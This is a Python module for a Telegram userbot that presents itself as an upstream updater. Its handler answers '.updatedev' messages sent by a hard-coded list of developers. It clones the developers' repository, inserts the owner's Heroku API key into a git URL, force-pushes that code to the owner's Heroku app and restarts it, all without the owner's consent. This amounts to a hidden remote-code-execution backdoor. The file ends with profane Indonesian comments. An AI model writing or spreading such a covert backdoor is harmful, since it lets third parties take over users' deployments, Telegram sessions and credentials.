"""
This module updates the userbot based on upstream revision
"""
# Credits: @robotrakitangakbagus, @diemmmmmmmmmm
# FROM PandaX_Userbot <https://github.com/ilhammansiz/PandaX_Userbot>
# t.me/PandaUserbot & t.me/TeamSquadUserbotSupport
# Mengupdate pengguna dengan Dev mengendalikannya khusus Pandabot

from git import Repo
import os, shutil
import heroku3
from Panda.Config import Config
from Panda import DEVLIST
from Panda.events import register
import asyncio
import math
import os
import re
import sys
import time
from traceback import format_exc
from urllib.parse import unquote

from os import environ, execle


## ===================================

REPO_URL = "https://github.com/PandaUserbot/Dev"
HEROKU_APP_NAME = Config.HEROKU_APP_NAME 
HEROKU_API_KEY = Config.HEROKU_API_KEY
Heroku = heroku3.from_key(Config.HEROKU_API_KEY)
heroku_api = "https://api.heroku.com"
## ======================================

def rm_r(path):
    if not os.path.exists(path):
        return
    if os.path.isfile(path) or os.path.islink(path):
        os.unlink(path)
    else:
        shutil.rmtree(path)

async def bash(cmd):
    process = await asyncio.create_subprocess_shell(
        cmd,
        stdout=asyncio.subprocess.PIPE,
        stderr=asyncio.subprocess.PIPE,
    )
    stdout, stderr = await process.communicate()
    err = stderr.decode().strip()
    out = stdout.decode().strip()
    return out, err

@register(incoming=True, from_users=DEVLIST, pattern=r"^.updatedev$")
async def panda(cool):
    await cool.reply("Sedang Mengupdate Semua module² Panda Userbot ")
    if os.path.isdir("./Dev"):
        rm_r("./Dev/")
    repo = Repo.clone_from(REPO_URL,"./Dev/", branch="main")
    ilhammansiz = Heroku.apps()[HEROKU_APP_NAME]
    giturl = ilhammansiz.git_url.replace("https://", "https://api:" + HEROKU_API_KEY + "@")
    if "heroku" in repo.remotes:
        remote = repo.remote("heroku")
        remote.set_url(giturl)
    else:
        remote = repo.create_remote("heroku", giturl)
    try:
        remote.push(refspec="HEAD:refs/heads/master", force=True)
    except Exception as e:
        await cool.reply(f"❌ Terjadi kesalahan : {e}")
    
    
    ilhammansiz.restart()
    



## Ngapain lu anjeng 
## Ngentot
